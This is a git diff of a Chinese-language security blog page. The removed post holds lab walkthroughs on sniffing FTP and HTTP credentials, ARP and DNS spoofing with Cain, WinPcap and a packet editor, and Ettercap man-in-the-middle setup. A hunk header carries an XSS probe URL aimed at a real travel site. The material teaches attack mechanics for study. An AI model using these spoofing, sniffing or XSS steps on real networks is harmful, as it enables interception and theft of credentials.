       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -761,6 +807,37 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  9.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  34
+                </span>
+              
+            </div>
+          
 
           
 
@@ -778,183 +855,16 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
 
       
         
-          
-            <h1 id="嗅探欺骗实验"><a href="#嗅探欺骗实验" class="headerlink" title="嗅探欺骗实验"></a>嗅探欺骗实验</h1><h2 id="FTP连接与密码明文抓取"><a href="#FTP连接与密码明文抓取" class="headerlink" title="FTP连接与密码明文抓取"></a>FTP连接与密码明文抓取</h2><h4 id="一【实验目标】"><a href="#一【实验目标】" class="headerlink" title="一【实验目标】"></a>一【实验目标】</h4><p>l TCP、UDP协议解析(端口，各标志字段，固定首部长度)<br>l IP协议解析(源、目的网络地址，各标志字段，分片标识，固定首部长度)<br>l Ethernet帧结构解析(源、目的MAC地址，帧长)<br>l 利用FTP明文传输特性，捕获用户名/密码</p>
+          <h1 id="嗅探欺骗实验"><a href="#嗅探欺骗实验" class="headerlink" title="嗅探欺骗实验"></a>嗅探欺骗实验</h1><h2 id="FTP连接与密码明文抓取"><a href="#FTP连接与密码明文抓取" class="headerlink" title="FTP连接与密码明文抓取"></a>FTP连接与密码明文抓取</h2><h4 id="一【实验目标】"><a href="#一【实验目标】" class="headerlink" title="一【实验目标】"></a>一【实验目标】</h4><p>l TCP、UDP协议解析(端口，各标志字段，固定首部长度)<br>l IP协议解析(源、目的网络地址，各标志字段，分片标识，固定首部长度)<br>l Ethernet帧结构解析(源、目的MAC地址，帧长)<br>l 利用FTP明文传输特性，捕获用户名/密码</p>
 <h4 id="二【实验环境】"><a href="#二【实验环境】" class="headerlink" title="二【实验环境】"></a>二【实验环境】</h4><p>l 实验机环境：windows xp操作系统<br>l 实验拓扑：如下图所示</p>
 <h4 id="三【实验原理】"><a href="#三【实验原理】" class="headerlink" title="三【实验原理】"></a>三【实验原理】</h4><p>FTP协议在网络传输中采取明文的形式传输用户名和密码。攻击者利用该特性就可获得被攻击者的敏感信息，并进行进一步的攻击。</p>
-<h4 id="四【实验步骤】"><a href="#四【实验步骤】" class="headerlink" title="四【实验步骤】"></a>四【实验步骤】</h4><ol>
-<li><p>本机地址为192.168.8.161，我们选择一个外网FTP服务器202.101.47.169</p>
-</li>
-<li><p>设置抓包参数：运行Wireshark.exe程序，设置接口网络适配器及过滤器。设置完毕，即可开始捕获网络数据包。</p>
-</li>
-<li><p>四层网络结构，每层都有不同的功能，由不同的协议组成。</p>
-</li>
-</ol>
-<p>EthernetII的帧结构为目的MAC地址+源MAC地址+上层协议类型+数据字段+校验。</p>
-<p>第一行为WireShark添加、该帧的相关统计信息。包括捕获时间、编号、帧长度、帧中所含有的协议等，如图所示。</p>
-<p>第二行为链路层信息，包括目的MAC地址、源MAC地址、上层协议类型，如下图。</p>
-<p> 第三行为网络层信息，如此处为IP协议。细节包括版本、头部长度、总长度、标志位、源/目的IP地址、上层协议等。</p>
-<p>第四行为传输层信息，包括源/目的端口、序列号、期望的下个序列号、确认号、头部长度、标志位、窗口长度、校验和等。</p>
-<ol start="4">
-<li>在本主机的Firefox地址栏输入<a href="ftp://202.101.47.169请求与服务器建立连接；在地址栏输入地址回车后，弹出输入用户名密码窗口，正确输入后即可访问。如下图所示。" target="_blank" rel="noopener">ftp://202.101.47.169请求与服务器建立连接；在地址栏输入地址回车后，弹出输入用户名密码窗口，正确输入后即可访问。如下图所示。</a></li>
-</ol>
-<p>我们使用用户名：e5yusimin-s，密码：password<br>客户端为192.168.8.161(本地)，目的服务器为202.101.47.169，发送连接建立请求。条件设置为“TCP”，可观察到下图所示的内容（查看第一个数据包的内容）。</p>
-<p>TCP标志位仅SYN置0，设置(相对)序列号为0(此处的序列号并不是真正的数据流字节号，只表示在此次连接过程中的序号)，请求与FTP服务器建立连接。本地的源端口号为62243，目的端口号为21(默认的FTP服务端口)，等待确认。服务器202.101.47.169收到请求数据包后，若同意请求，则向客户端做出确认应答。可以看到下图所示的内容。</p>
-<p>服务器的响应报文中，ACK、SYN标志位置1，序列号为0(理由同上)，确认号为1(是请求报文的相对序列号加1)。相应端口为：源21，目的62243。客户端收到确认报文后，通知上层应用进程，连接已经建立。<br> 客户端收到服务器的确认后，向服务器给出确认。可以看到如下图所示内容。</p>
-<p>客户端的确认报文中，标志位仅ACK置1，相对序列号为1(请求报文序列号加1)，确认号为1(对服务器确认报文相对序列号加1)。服务器收到客户端的确认报文后，也通知其上层应用进程，连接已经建立。至此，客户端与服务器之间完成了“三次握手”过程，连接建立。</p>
-<p>​      通过WireShark，我们能够了解到数据包中的全部明文信息，而且WireShark还能通过序列号及确认号做出分析，判断该帧属于连接过程中的哪一阶段。</p>
-<ol start="5">
-<li><p>捕获用户名密码：传输建立后，服务器的FTP进程做出响应，如下图所示。</p>
-<p>220：表示“服务就绪”。后面为服务器返回的欢迎信息。</p>
-</li>
-</ol>
-<p>服务器的响应报文中ACK、PSH标志位置1，PSH位置1表示服务器希望尽快得到客户端的响应。客户端接收到此报文后会尽快将此报文交付应用进程，而不是等到缓存堆满后交付。<br>      本地FTP提示用户输入用户名，报文内容为向服务器发送用户名请求</p>
-<p>331：表示用户名正确，需要口令。<br>客户端收到交给本地FTP处理，用户键入口令，客户端向服务器发送请求</p>
-<p>请求的内容为口令PASS，消息为password，此时，用户名、密码均已嗅探得到了。<br>用户已登录，如下图所示</p>
-<p>230：表示用户已登录</p>
-<h4 id="五【实验思考】"><a href="#五【实验思考】" class="headerlink" title="五【实验思考】"></a>五【实验思考】</h4><p>l 以所抓网络数据包为例，分析数据封装的过程<br>l 根据抓获的网络数据包，实际分析FTP交互的过程，标出捕获的用户名/密码对</p>
-<hr>
-<h2 id="wireshark进行网络监听"><a href="#wireshark进行网络监听" class="headerlink" title="wireshark进行网络监听"></a>wireshark进行网络监听</h2><h4 id="一【实验目标】-1"><a href="#一【实验目标】-1" class="headerlink" title="一【实验目标】"></a>一【实验目标】</h4><p>l 掌握使用CCProxy配置代理服务器<br>l 掌握使用wireshark抓取数据包<br>l 能够对数据包进行简单的分析</p>
-<h4 id="二【实验环境】-1"><a href="#二【实验环境】-1" class="headerlink" title="二【实验环境】"></a>二【实验环境】</h4><p>l 实验机环境：Windows XP系统<br>l 目标机环境：Windows2003系统<br>l 实验拓扑：如下图所示。</p>
-<h4 id="三【实验原理】-1"><a href="#三【实验原理】-1" class="headerlink" title="三【实验原理】"></a>三【实验原理】</h4><p>​      1）网络监听是一种监视网络状态、数据流程以及网络上信息传输的管理工具，它可以将网络界面设定成监听模式，并且可以截获网络上所传输的信息。也就是说，当黑客登录网络主机并取得超级用户权限后，若要登录其它主机，使用网络监听便可以有效地截获网络上的数据，这是黑客使用最好的方法。但是网络监听只能应用于连接同一网段的主机，通常被用来获取用户密码等。<br>​       2）以太网协议的工作方式是将要发送的数据包发往连接在一起的所有主机。在包头中包括有应该接收数据包的主机的正确地址，因为只有与数据包中目标地址一致的那台主机才能接收到信息包，但是当主机工作在监听模式下的话，不管数据包中的目标物理地址是什么，主机都将可以接收到。许多局域网内有十几台甚至上百台主机是通过一个电缆、一个集线器连接在一起的，在协议的高层或者用户来看，当同一网络中的两台主机通信的时候，源主机将写有目的的主机地址的数据包直接发向目的主机。<br>​       3）代理服务器：代理服务器英文全称是Proxy Server，其功能就是代理网络用户去取得网络信息。形象的说：它是网络信息的中转站。<br>​       4）中间人攻击（Man-in-the-Middle Attack, MITM）是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。</p>
-<h4 id="四【实验步骤】-1"><a href="#四【实验步骤】-1" class="headerlink" title="四【实验步骤】"></a>四【实验步骤】</h4><p>1 配置代理服务器，实验机作为代理服务器，单击桌面上的CCProxy图标启动CCProxy，如下图所示：</p>
-<p>代理服务器的地址：</p>
-<p>2 在目标机设置IIS WEB服务器以支持ASP</p>
-<p>3 在目标机打开IE浏览器，设置代理服务器：</p>
-<p>4 登录<a href="http://192.168.8.237" target="_blank" rel="noopener">http://192.168.8.237</a></p>
-<p>5 在实验机打开桌面的wireshark，进行监听。<br>6 设置过滤规则，在“Filter”中填写“http”并回车，只过滤HTTP协议，选择网卡后，单击开始，进入抓包模式。</p>
-<p>7 切换到目标机，点击“管理留言”，输入用户名与密码进入管理界面。</p>
-<p>8 对wireshark捕获的数据进行分析，查看捕获到的数据。</p>
-<p>得到被监听用户的账号密码（皆为admin）</p>
-<h4 id="五【实验思考】-1"><a href="#五【实验思考】-1" class="headerlink" title="五【实验思考】"></a>五【实验思考】</h4><p>l 如果你是用户，设置某代理服务器后，什么样的信息会面临监听风险？在被此状态下，一切明文信息都有被监听的风险。<br>l 有哪些方法可以避免监听？将在传输中的信息进行加密。此外，登录系统应保存用户密码的hash散列值而不是密码本身，用户在本机登录过程中，发送的信息应该是用户输入的密码的散列值以跟服务器内的散列值匹配而不是发送密码。这样即使被监听到，中间人也无法恢复原密码或找到碰撞匹配。</p>
-<hr>
-<h2 id="Winpcap编程实现ARP欺骗"><a href="#Winpcap编程实现ARP欺骗" class="headerlink" title="Winpcap编程实现ARP欺骗"></a>Winpcap编程实现ARP欺骗</h2><h4 id="一【实验目标】-2"><a href="#一【实验目标】-2" class="headerlink" title="一【实验目标】"></a>一【实验目标】</h4><p>l 掌握Winpcap的编程方法；<br>l 理解ARP欺骗的原理</p>
-<h4 id="二【实验环境】-2"><a href="#二【实验环境】-2" class="headerlink" title="二【实验环境】"></a>二【实验环境】</h4><p>l 实验机环境：Windows XP系统</p>
-<h4 id="三【实验原理】-2"><a href="#三【实验原理】-2" class="headerlink" title="三【实验原理】"></a>三【实验原理】</h4><p>ARP（Address Resolution Protocol）是地址解析协议，是一种将IP地址转化成物理地址的协议。从IP地址到物理地址的映射有两种方式：表格方式和非表格方式。ARP具体说来就是将网络层（也就是相当于OSI的第三层）地址解析为数据链路层（也就是相当于OSI的第二层）的物理地址。<br>ARP协议并不只在发送了ARP请求才接受ARP应答。当计算机接收到ARP应答数据包的时候，就会对本地的ARP缓存进行更新，将应答中的IP和MAC地址存储在ARP缓存表中。因此，当局域网中的某台机器B向A发送一个自己伪造的ARP应答，而如果这个应答是B冒充C伪造来的，即IP地址为C的IP,而MAC地址是伪造的，则当A接收到B伪造的ARP应答后，就会更新本地的ARP缓存，这样A看来C的IP地址没有变，而它的MAC地址已经不是原来那个了。</p>
-<h4 id="四【实验步骤】-2"><a href="#四【实验步骤】-2" class="headerlink" title="四【实验步骤】"></a>四【实验步骤】</h4><p>1、  准备工作<br>从影响网络连接通畅的方式来看，ARP欺骗分为二种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了。<br>2、 ARP数据包格式<br>要进行ARP欺骗攻击，就必须熟悉ARP数据包的格式，以便构造ARP数据包进行欺骗攻击。</p>
-<p>  设计代码的主要思想就是通过发送自己构造的ARP数据包，不断地发送给被攻击者，使ip地址和真实的mac地址无法对应。接下来为实验过程。<br>3、 查看未被攻击前的ARP表</p>
-<p>  192.168.8.1是局域网的网关，上网必须通过此网关进行数据交换，此时真实的mac地址为00-06-f6-43-44-4a。<br>4、 运行程序</p>
-<p>5、 原理解释<br>该程序为每隔0.5秒给被攻击者发送一个数据回复包。从虚拟机的wireshark中可以抓到该ARP欺骗包，分析ARP数据包的格式可以发现与自己构造的数据包一样，即表示攻击成功。</p>
-<p>6、 再次查看ARP缓存表<br>发现已经被虚假的mac地址给替换了。</p>
-<p>由于192.168.8.1为网关的IP地址，所以其mac地址一旦被篡改，则无法进行联网，即进行了”禁止上网”攻击。</p>
-<h4 id="五【实验思考】-2"><a href="#五【实验思考】-2" class="headerlink" title="五【实验思考】"></a>五【实验思考】</h4><p>l 面对ARP欺骗我们应该如何应对</p>
-<hr>
-<h2 id="cain进行ARP-DNS欺骗实验"><a href="#cain进行ARP-DNS欺骗实验" class="headerlink" title="cain进行ARP_DNS欺骗实验"></a>cain进行ARP_DNS欺骗实验</h2><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>虚拟机windows 2012 x64 位（开机密码：1qaz2wsx!）<br>CainAbel</p>
-<h4 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h4><p>ARP欺骗是黑客常用的攻击手段之一，ARP欺骗分为二种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。<br>第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。<br>ARP表是IP地址和MAC地址的映射关系表，任何实现了IP协议栈的设备，一般情况下都通过该表维护IP地址和MAC地址的对应关系，这是为了避免ARP解析而造成的广播数据报文对网络造成冲击。ARP表的建立一般情况下是通过二个途径：</p>
-<p>主动解析<br>如果一台计算机想与另外一台不知道MAC地址的计算机通信，则该计算机主动发ARP请求，通过ARP协议建立(前提是这两台计算机位于同一个IP子网上)。<br>被动请求<br>如果一台计算机接收到了一台计算机的ARP请求，则首先在本地建立请求计算机的IP地址和MAC地址的对应表。<br>因此，针对ARP表项，一个可能的攻击就是误导计算机建立正确的ARP表。根据ARP协议，如果一台计算机接收到了一个ARP请求报文，在满足下列两个条件的情况下，该计算机会用ARP请求报文中的源IP地址和源物理地址更新</p>
-<p>自己的ARP缓存：<br>如果发起该ARP请求的IP地址在自己本地的ARP缓存中；<br>请求的目标IP地址不是自己的。<br>可以举一个例子说明这个过程，假设有三台计算机A，B，C，其中B已经正确建立了A和C计算机的ARP表项。假设A是攻击者，此时，A发出一个ARP请求报文，该ARP请求报文这样构造：<br>源IP地址是C的IP地址，源物理地址是A的MAC地址；<br>请求的目标IP地址是B的IP地址。<br>这样计算机B在收到这个ARP请求报文后(ARP请求是广播报文，网络上所有设备都能收到)，发现B的ARP表项已经在自己的缓存中，但MAC地址与收到的请求的源物理地址不符，于是根据ARP协议，使用ARP请求的源物理地址(即A的MAC地址)更新自己的ARP表。<br>这样B的ARP缓存中就存在这样的错误ARP表项：C的IP地址跟A的MAC地址对应。这样的结果是，B发给C的数据都被计算机A接收到。</p>
-<p>DNS欺骗原理<br>在DNS的缓存还没有过期之前,如果在DNS的缓存中已经存在的记录,一旦有客户查询,DNS服务器将会直接返回缓存中的记录. </p>
-<p>下面我们来看一个例子:<br>一台运行着unix的Internet主机,并且提供rlogin服务,它的IP地址为123.45.67.89,它使用的DNS服务器(即/etc/resolv.conf中指向的DNS服务器)的IP地址为98.76.54.32,某个客户端(IP地址为38.222.74.2)试图连接到unix主机的rlogin端口,假设unix主机的/etc/hosts.equiv文件中使用的是dns名称来允许目标主机的访问,那么unix主机会向IP为98.76.54.32的DNS服务器发出一个PTR记录的查询: </p>
-<p>123.45.67.89 -&gt; 98.76.54.32 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: 2.74.222.38.in-addr.arpa PTR </p>
-<p>IP为98.76.54.32的DNS服务器中没有这个反向查询域的信息,经过一番查询,这个DNS服务器找到38.222.74.2和38.222.74.10为74.222.38.in-addr.arpa.的权威DNS服务器,所以它会向38.222.74.2发出PTR查询: </p>
-<p>98.76.54.32 -&gt; 38.222.74.2 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: 2.74.222.38.in-addr.arpa PTR </p>
-<p>请注意,38.222.74.2是我们的客户端IP,也就是说这台机子是完全掌握在我们手中的.我们可以更改它的DNS记录,让它返回我们所需要的结果: </p>
-<p>38.222.74.2 -&gt; 98.76.54.32 [Answer]<br>NQY: 1 NAN: 2 NNS: 2 NAD: 2<br>QY: 2.74.222.38.in-addr.arpa PTR<br>AN: 2.74.222.38.in-addr.arpa PTR trusted.host.com<br>AN: trusted.host.com A 38.222.74.2<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10 </p>
-<p>当98.76.54.32的DNS服务器收到这个应答后,会把结果转发给123.45.67.98,就是那台有rlogin服务的unix主机(也是我们的目标 :) ),并且98.76.54.32这台DNS服务器会把这次的查询结果缓存起来. </p>
-<p>这时unix主机就认为IP地址为38.222.74.2的主机名为trusted.host.com,然后unix主机查询本地的/etc/hosts.equiv文件,看这台主机是否被允许使用rlogin服务,很显然,我们的欺骗达到了. </p>
-<p>在unix的环境中,有另外一种技术来防止这种欺骗的发生,就是查询PTR记录后,也查询PTR返回的主机名的A记录,然后比较两个IP地址是否相同: </p>
-<p>123.45.67.89 -&gt; 98.76.54.32 [Query]<br>NQY: 1 NAN: 0 NNS: 0 NAD: 0<br>QY: trusted.host.com A </p>
-<p>很不幸,在98.76.54.32的DNS服务器不会去查询这个记录,而会直接返回在查询2.74.222.38.in-addr.arpa时得到的并且存在缓存中的信息: </p>
-<p>98.76.54.32 -&gt; 123.45.67.89 [Query]<br>NQY: 1 NAN: 1 NNS: 2 NAD: 2<br>QY: trusted.host.com A<br>AN: trusted.host.com A 38.222.74.2<br>NS: 74.222.38.in-addr.arpa NS ns.sventech.com<br>NS: 74.222.38.in-addr.arpa NS ns1.sventech.com<br>AD: ns.sventech.com A 38.222.74.2<br>AD: ns1.sventech.com A 38.222.74.10 </p>
-<p>那么现在unix主机就认为38.222.74.2就是真正的trusted.host.com了,我们的目的达到了!</p>
-<p>ARP欺骗和DNS欺骗的异同点<br>ARP是局域网，DNS是internet攻击<br>ARP欺骗是黑客常用的攻击手段之一，ARP欺骗分为二种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。 第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。 一般来说，ARP欺骗攻击的后果非常严重，大多数情况下会造成大面积掉线。有些网管员对此不甚了解，出现故障时，认为PC没有问题，交换机没掉线的“本事”，电信也不承认宽带故障。而且如果第一种ARP欺骗发生时，只要重启路由器，网络就能全面恢复，那问题一定是在路由器了。为此，宽带路由器背了不少“黑锅”。<br>其实效果都差不多，ARP病毒您自己去百度一下，有很详细的资料，您看看应该就明白了。DNS攻击是阻塞服务器网络，使服务器瘫痪</p>
-<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>对Cain进行配置<br>打开Cain（在C:\课程\网络欺骗技术\CainAbel-v4.9.53.zip压缩包中）<br>解压出来是个安装包，默认安装。然后打开软件。</p>
-<p>单击configure选项，然后在标签中选择ARP(Arp Poison Routeing)对话框中进行配置</p>
-<p>其中192.168.242.155为伪造的IP地址。（根据实际子网情况选择同一自网段的伪造IP地址）<br>选择功能栏的嗅探器sniffer，然后在选择下面的主机Hosts，在扫描前需要先激活嗅探器，点击上面的 ，然后再空白处右键单击，如图所示</p>
-<p>选择Scan MAC Addresses进行扫描</p>
-<p>点击下面的 ，然后在右边的空白处单击</p>
-<p>然后点上面的“加号”，会出现一个New ARP Poison Routing对话框，在框的左边选取局域网的网关，在框的右边选取被欺骗的IP地址</p>
-<p>点击 ARP-DNS选项，然后在点击上面的“加号”，并进行配置</p>
-<p>然后点击第三个黄色图标开始欺骗 。</p>
-<p>用192.168.242.128这台主机访问<a href="http://www.baidu.com进入的不是百度的首页而是211.71.233.40这个网站" target="_blank" rel="noopener">www.baidu.com进入的不是百度的首页而是211.71.233.40这个网站</a></p>
-<h4 id="实验完成"><a href="#实验完成" class="headerlink" title="实验完成"></a>实验完成</h4><p>在对ARP_DNS进行欺骗时，选择欺骗的网关应怎样设置?<br>任意选择<br>在框的左边选取<br>在框的右边选取<br>同时选取<br>答案【B】</p>
-<hr>
-<h2 id="利用网络协议编辑软件实现ARP欺骗实验"><a href="#利用网络协议编辑软件实现ARP欺骗实验" class="headerlink" title="利用网络协议编辑软件实现ARP欺骗实验"></a>利用网络协议编辑软件实现ARP欺骗实验</h2><h4 id="一【实验目标】-3"><a href="#一【实验目标】-3" class="headerlink" title="一【实验目标】"></a>一【实验目标】</h4><p>l 理解实现ARP地址欺骗过程<br>l 了解防范ARP地址欺骗</p>
-<h4 id="二【实验环境】-3"><a href="#二【实验环境】-3" class="headerlink" title="二【实验环境】"></a>二【实验环境】</h4><p>l 实验机环境：windows xp操作系统<br>l 目标机1环境：windows xp操作系统（作为网关）<br>l 目标机2环境：windows xp操作系统<br>l 实验拓扑：如下图所示。</p>
-<h4 id="三【实验原理】-3"><a href="#三【实验原理】-3" class="headerlink" title="三【实验原理】"></a>三【实验原理】</h4><p>ARP欺骗是黑客常用的攻击手段之一，ARP欺骗分为二种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。<br>第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。<br>ARP表是IP地址和MAC地址的映射关系表，任何实现了IP协议栈的设备，一般情况下都通过该表维护IP地址和MAC地址的对应关系，这是为了避免ARP解析而造成的广播数据报文对网络造成冲击。ARP表的建立一般情况下是通过二个途径：<br>(1)主动解析<br>如果一台计算机想与另外一台不知道MAC地址的计算机通信，则该计算机主动发ARP请求，通过ARP协议建立(前提是这两台计算机位于同一个IP子网上)。<br>(2)被动请求<br>如果一台计算机接收到了一台计算机的ARP请求，则首先在本地建立请求计算机的IP地址和MAC地址的对应表。<br>因此，针对ARP表项，一个可能的攻击就是误导计算机建立正确的ARP表。根据ARP协议，如果一台计算机接收到了一个ARP请求报文，在满足下列两个条件的情况下，该计算机会用ARP请求报文中的源IP地址和源物理地址更新自己的ARP缓存：<br>(1)如果发起该ARP请求的IP地址在自己本地的ARP缓存中；<br>(2)请求的目标IP地址不是自己的。<br>可以举一个例子说明这个过程，假设有三台计算机A，B，C，其中B已经正确建立了A和C计算机的ARP表项。假设A是攻击者，此时，A发出一个ARP请求报文，该ARP请求报文这样构造：<br>(1)源IP地址是C的IP地址，源物理地址是A的MAC地址；<br>(2)请求的目标IP地址是B的IP地址。<br>这样计算机B在收到这个ARP请求报文后(ARP请求是广播报文，网络上所有设备都能收到)，发现B的ARP表项已经在自己的缓存中，但MAC地址与收到的请求的源物理地址不符，于是根据ARP协议，使用ARP请求的源物理地址(即A的MAC地址)更新自己的ARP表。<br>这样B的ARP缓存中就存在这样的错误ARP表项：C的IP地址跟A的MAC地址对应。这样的结果是，B发给C的数据都被计算机A接收到。</p>
-<h4 id="四【实验步骤】-3"><a href="#四【实验步骤】-3" class="headerlink" title="四【实验步骤】"></a>四【实验步骤】</h4><p>(1) 启动windows实验台，Ping 网关。</p>
-<p>(2) 在目标机2为192.168.8.184（ip地址是自动分配，具体ip请看实际情况）的主机上使用arp –a命令查看网关的arp的列表，如图所示。 </p>
-<p>(3) 从工具箱中下载工具，编辑ARP数据包，模拟网关路由器发送ARP更新信息，改变目标机2的arp列表。首先打开协议编辑软件，点击菜单栏“添加”。 </p>
-<p>(4) 添加一个ARP协议模板，将时间差设置为3毫秒，点击确认添加。 </p>
-<p>(5) 修改协议模板的每个值</p>
-<p>(6) 编辑完成并经过校验的数据包。<br>(7) 编辑并校验完成后，点击 发送 按钮。 </p>
-<p>(8) 在目标机2上使用命令arp –a命令来查看arp表项。 </p>
-<p>此时，所有向外发送的数据包，都会被转发到攻击者的主机上，从而获得敏感信息。<br>用命令arp–d 命令来清空ip，以便后续实验的进行。</p>
-<h4 id="五【实验思考】-3"><a href="#五【实验思考】-3" class="headerlink" title="五【实验思考】"></a>五【实验思考】</h4><p>l 如何防止ARP欺骗。<br>l 如果受到了ARP欺骗如何破解这种欺骗并保持正常网络环境。</p>
-<hr>
-<h2 id="利用TCPDUMP进行网络嗅探"><a href="#利用TCPDUMP进行网络嗅探" class="headerlink" title="利用TCPDUMP进行网络嗅探"></a>利用TCPDUMP进行网络嗅探</h2><p>l 实验机环境：KALI 2.0操作系统<br>l 目标机环境：WINDOWS 2003系统</p>
-<h4 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理"></a>实验原理</h4><p>网络嗅探是指一个能够监视网络数据的软件程序或硬件设备。它可以通过复制数据的方法测试网站连通状况，不会修改数据。使用网络嗅探器，可以了解网站都有些什么信息。网络嗅探器既可以帮助网络工程师解决网络问题，但它同时也可以实现具有恶意的目标。如果网络数据未经加密，而且计算机之间的连接是使用集线器，那网络通信信息，例如用户名和密码、邮件内容等信息，都将很容易被捕获。幸运的是，如果组网使用的是交换机，那么问题会复杂一些，但仍可以捕获信息。</p>
-<h4 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h4><ol>
-<li>打开实验机，点击终端进入命令行模式，然后输入tcpdump –h查看工具使用方法 </li>
-</ol>
-<ol start="2">
-<li><p>tpcdump可以不加任何参数，会默认监视第一个网络接口上所有流过的数据包</p>
-</li>
-<li><p>在目标机上打开命令提示符，输入ipconfig进行目标机ip地址的查询</p>
-</li>
-</ol>
-<ol start="4">
-<li><p>得知目标机ip地址之后，在实验机终端上输入tcpdump host 192.168.122.33来监视目标机的数据包</p>
-</li>
-<li><p>在目标机上的命令提示符中输入ping 192.168.122.98 (实验机ip地址)，并查看实验机上的结果</p>
-</li>
-</ol>
-<ol start="6">
-<li>监视主机的指定端口信息，tcpdump也可以做到，命令为：tcpdump udp port 53，然后打开kali自带的浏览器，并刷新。该端口是用来进行DNS查询的，而且用的是UPD协议</li>
-</ol>
-<ol start="7">
-<li>另外还可以监视TCP协议，命令为：tcpdump tcp port 80，</li>
-</ol>
-<ol start="8">
-<li>打开自带的浏览器，随意输入域名</li>
-</ol>
-<ol start="9">
-<li><p>再查看终端tcpdump界面，就会看到数据包信息</p>
-<hr>
-<p>使用Ettercap工具实现中间人攻击<br>l  实验机环境：KALI 2.0操作系统<br>l  目标机环境：windows7系统</p>
-<p>Ettercap是Linux下一个强大的欺骗工具，用户能使用该工具快速的创建伪造的包，实现从网络适配器到应用软件各种级别的包，绑定监听数据到一个本地端口等。用户通过使用ettercap工具实施中间人攻击，从而捕获到目标系统的信息，帮助用户创建密码字典。<br>ARP欺骗并不是使网络无法正常通信，而是通过冒充网关或其它主机使得到达网关或主机的数据流通过攻击主机进行转发。通过转发流量可以对流量进行控制和查看，从而控制流量或得到机密信息。<br>实现中间人攻击分为两个阶段。第一是通过某种手段去攻击一台计算机；第二是欺骗主机。第一阶段：主机B（攻击者）通过ARP注入攻击的方法以实现ARP欺骗，通过ARP欺骗的方法控制主机A（被攻击者）与其它主机间的流量及机密信息。第二阶段：在第一阶段攻击成功后，主机B就可以在这个网络中使用中间人的身份，转发或查看主机A和其它主机间的数据流。</p>
-<p>实验步骤<br>1、如果是第一次进行中间人攻击操作，需要对Ettercap的配置文件etter.conf进行编辑。<br>2、首先使用locate命令查找该文件位置，如图：（由输出信息可知配置文件etter.conf保存在/etc/ettercap/中）<br>3、输入命令 vi /etc/ettercap/etter.conf，使用Vim编辑器对该配置文件进行编辑。回车后如下图：（部分截图）</p>
-</li>
-</ol>
-<p>   按a 进入编辑模式，将该文件中的ec_uid和ec_gid<br>   配置项值改为0。（该部分输入结果较多，此处只列出了要修改的部分。）</p>
-<p>   修改前：privs</p>
-<p>   ​               ec_uid = 65534</p>
-<p>   ​               ec_uid = 65534</p>
-<p>   修改后：privs</p>
-<p>   ​               ec_uid = 0</p>
-<p>   ​               ec_uid = 0</p>
-<p>   将Linux部分附近iptables行的注释去掉。</p>
-<p>   5、编辑完成后按esc键再输 :wq 保存并退出。<br>   6、输入命令 ettercap –G，打开Ettercap图形界面。</p>
-<p>   7、进行如下操作：</p>
-<p>   点击Unified sniffing，后，显示如下界面：</p>
-<p>   8、选择eth0，并“确定”，启动该接口。</p>
-<p>   9、进行如下操作，点击Scan for hosts后，扫描所有的主机。</p>
-<p>   10、选择Hosts list，将会显示扫描到的主机的IP和MAC地址，如下图：</p>
